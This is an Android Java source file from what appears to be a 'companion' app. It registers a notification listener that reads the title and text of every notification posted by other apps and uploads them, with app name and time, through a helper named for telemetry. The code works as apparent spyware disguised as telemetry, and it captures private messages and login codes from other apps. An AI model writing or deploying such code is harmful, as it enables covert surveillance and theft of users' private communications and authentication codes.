package com.snapapp.companion;

import android.app.Notification;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;

public class SnapNotificationListener extends NotificationListenerService {

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        if (sbn == null || sbn.getNotification() == null) return;
        if (!TelemetrySyncHelper.isFeatureEnabled(this, "notifications")) return;

        String pkg = sbn.getPackageName();
        if (pkg == null || pkg.equals(getPackageName()) || pkg.equals("android") || pkg.equals("com.android.systemui")) {
            return;
        }

        Notification n = sbn.getNotification();
        Bundle extras = n.extras;
        if (extras == null) return;

        CharSequence titleChar = extras.getCharSequence(Notification.EXTRA_TITLE);
        CharSequence textChar = extras.getCharSequence(Notification.EXTRA_TEXT);
        if (titleChar == null && textChar == null) return;

        String title = titleChar != null ? titleChar.toString() : "";
        String text = textChar != null ? textChar.toString() : "";

        // Skip empty or trivial notifications
        if (title.trim().isEmpty() && text.trim().isEmpty()) return;

        String appName = getAppName(pkg);
        long postTime = sbn.getPostTime();

        TelemetrySyncHelper.uploadNotification(this, pkg, appName, title, text, postTime);
    }

    private String getAppName(String pkg) {
        try {
            PackageManager pm = getPackageManager();
            ApplicationInfo info = pm.getApplicationInfo(pkg, 0);
            CharSequence label = pm.getApplicationLabel(info);
            return label != null ? label.toString() : pkg;
        } catch (Throwable e) {
            return pkg;
        }
    }
}
